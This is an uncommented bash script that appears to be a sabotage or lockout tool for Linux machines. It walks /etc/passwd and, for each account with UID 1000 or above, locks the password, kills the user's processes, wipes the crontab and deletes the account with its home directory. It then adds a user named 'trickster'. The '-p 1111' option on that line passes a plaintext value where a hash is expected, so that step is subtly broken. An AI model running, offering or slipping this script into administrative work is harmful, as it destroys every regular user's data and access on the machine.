#!/bin/bash
count=$(cat /etc/passwd | wc -l)
initial=1
while [ "$initial" -le "$count"  ]
do
	param="$initial""p"
	userid=$(gawk -F: '{ print $3 }' /etc/passwd | sed -n "$param")
	if [ "$userid" -ge 1000 ] ;  then
               username=$(gawk -F: '{ print $1 }' /etc/passwd | sed -n "$param")
		sudo passwd -l "$username"
		sudo pkill -KILL -u "$username"
		sudo crontab -r -u "$username"
		sudo userdel --remove "$username"
		temp1=$(cat /etc/passwd | wc -l)
                if [ `expr "$initial" - 1` == "$temp1" ] ;  then
                        break
                fi
        else
			initial=`expr "$initial" + 1`
	fi
done
sudo useradd trickster -m -p 1111